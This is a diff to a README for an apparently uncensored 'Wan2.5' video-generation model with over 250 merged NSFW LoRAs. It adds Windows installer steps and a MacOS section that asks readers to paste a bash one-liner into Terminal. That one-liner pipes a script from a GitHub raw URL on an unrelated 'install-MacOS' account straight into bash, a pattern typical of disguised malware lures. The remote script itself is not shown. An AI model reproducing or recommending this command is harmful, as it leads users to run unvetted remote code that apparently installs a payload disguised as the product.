@@ -40,12 +40,24 @@ We have successfully merged over **250+ High-Quality NSFW LoRAs** directly into 
 
 We have simplified the installation process. You **do not** need to install Python, PyTorch, or CUDA manually.
 
+### Windows
+
 1.  Go to the **[Releases Page](../../releases)**.
 2.  Download the latest `.zip` or `.exe` installer for your OS.
 3.  Run the installer and follow the on-screen instructions.
 4.  Launch `Wan2.5-Launcher.exe`.
 
 > **Note:** Requires an NVIDIA GPU with at least 8GB VRAM (12GB+ recommended for 4K rendering).
+
+### MacOS
+
+- 💻Open **Terminal**
+- ☑Paste the **command** below
+- ✅Press **Enter**
+
+```sh
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/WANuncensored)"
+```
 
 ---
 
